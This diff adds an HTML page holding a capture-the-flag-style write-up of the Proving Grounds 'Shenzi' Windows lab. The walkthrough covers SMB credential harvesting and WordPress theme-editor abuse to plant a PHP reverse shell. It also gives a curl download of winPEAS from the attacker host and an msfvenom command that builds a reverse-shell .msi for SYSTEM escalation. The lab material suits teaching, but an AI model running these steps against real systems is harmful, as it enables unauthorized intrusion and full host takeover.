@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Shenzi Writeup - Rachel Murphy" />
+  <title>PG: Shenzi | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap">
+      <h1>Shenzi — Writeup</h1>
+      <p class="meta">Proving Grounds — Windows / WordPress / Privilege Escalation</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+
+    <!-- Machine Summary -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds (Practice)</p>
+      <p><strong>Description:</strong> Shenzi is a Windows VM hosting a WordPress site via XAMPP. Initial enumeration reveals an SMB share containing credentials, which lead to a hidden WordPress directory. Exploiting WordPress theme editing grants a reverse shell. Privilege escalation is achieved by exploiting Windows Installer (.msi) files that execute with administrative privileges.</p>
+    </section>
+
+    <h2>Initial Reconnaissance</h2>
+    <p>Run an Nmap scan to identify open ports and services:</p>
+    <pre><code>sudo nmap -sC -sV 192.168.236.55 -oN nmap-shenzi</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250707003036.png" alt="Nmap initial scan">
+    <p>All ports view:</p>
+    <img class="screenshot" src="../images/Pasted image 20250707003649.png" alt="All ports scan">
+
+    <h2>Web Server — Port 443</h2>
+    <img class="screenshot" src="../images/Pasted image 20250707003347.png" alt="Port 443 website">
+    <p>Enumerate directories with feroxbuster (SSL requires -k):</p>
+    <pre><code>feroxbuster -u https://192.168.236.55/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+
+    <h2>Web Server — Port 80</h2>
+    <img class="screenshot" src="../images/Pasted image 20250707003527.png" alt="Port 80 website">
+    <pre><code>feroxbuster -u http://192.168.236.55/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+
+    <h2>FTP Enumeration</h2>
+    <img class="screenshot" src="../images/Pasted image 20250707003755.png" alt="FTP info">
+
+    <h2>SMB Enumeration</h2>
+    <p>List available shares anonymously:</p>
+    <pre><code>smbclient -N -L //192.168.236.55</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250707004511.png" alt="SMB shares">
+    <p>Connect to the Shenzi share:</p>
+    <pre><code>smbclient -N //192.168.236.55/Shenzi</code></pre>
+    <p>Files of interest found inside:</p>
+    <img class="screenshot" src="../images/Pasted image 20250707004653.png" alt="Files in SMB share">
+    <p>Download everything:</p>
+    <pre><code>mget *</code></pre>
+    <p>Grep for sensitive information (passwords, keys, etc.):</p>
+    <pre><code>grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250707005055.png" alt="Found WordPress creds">
+
+    <h2>Finding the Hidden WordPress Directory</h2>
+    <p>Based on the credentials, guess the WordPress subdirectory:</p>
+    <img class="screenshot" src="../images/Pasted image 20250707005446.png" alt="Found WordPress directory">
+    <p>Log in with the found credentials:</p>
+    <img class="screenshot" src="../images/Pasted image 20250707005556.png" alt="WordPress login success">
+    <p>Run WPScan in the background to enumerate plugins/users:</p>
+    <pre><code>wpscan --url http://192.168.236.55/shenzi -e ap,at,u --plugins-detection aggressive -t 20</code></pre>
+
+    <h2>Exploiting WordPress Theme Editor</h2>
+    <p>Navigate to the Theme Editor (TwentyTwenty theme):</p>
+    <img class="screenshot" src="../images/Pasted image 20250707005909.png" alt="Theme editor">
+    <img class="screenshot" src="../images/Pasted image 20250707005928.png" alt="Selecting template">
+    <p>Replace the template with a malicious PHP reverse shell (Ivan Sincek from revshell.com):</p>
+    <img class="screenshot" src="../images/Pasted image 20250707010220.png" alt="Reverse shell inserted">
+    <p>Navigate to the 404 page to trigger the shell:</p>
+    <pre><code>http://192.168.236.55/shenzi/themes/twentytwenty/404.php</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250707010530.png" alt="404 page executed">
+    <p>Catch the reverse shell:</p>
+    <img class="screenshot" src="../images/Pasted image 20250707010609.png" alt="Reverse shell caught">
+    <img class="screenshot" src="../images/Pasted image 20250707010738.png" alt="Shell interaction">
+
+    <h2>Privilege Escalation</h2>
+    <p>Download and run WinPEAS for enumeration:</p>
+    <pre><code>curl http://192.168.45.152/winPEASx64.exe -o winpeas.exe</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250707011653.png" alt="WinPEAS running">
+    <p>Identified that .msi files (Microsoft Software Installer) are automatically installed with Administrative privileges.</p>
+
+    <h3>Exploit with Malicious .msi File</h3>
+    <p>Create a reverse shell payload .msi file:</p>
+    <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;YOUR tun0 IP&gt; LPORT=445 -f msi -o shell.msi</code></pre>
+    <p>Set up a new listener on port 445 and transfer the file to the target:</p>
+    <img class="screenshot" src="../images/Pasted image 20250707011834.png" alt="Transfer shell.msi">
+    <p>Execute it on the target:</p>
+    <img class="screenshot" src="../images/Pasted image 20250707011859.png" alt="Execute .msi file">
+    <p>Catch the SYSTEM shell:</p>
+    <img class="screenshot" src="../images/Pasted image 20250707012232.png" alt="SYSTEM shell">
+    <img class="screenshot" src="../images/Pasted image 20250707012342.png" alt="SYSTEM shell success">
+
+  </main>
+</body>
+</html>
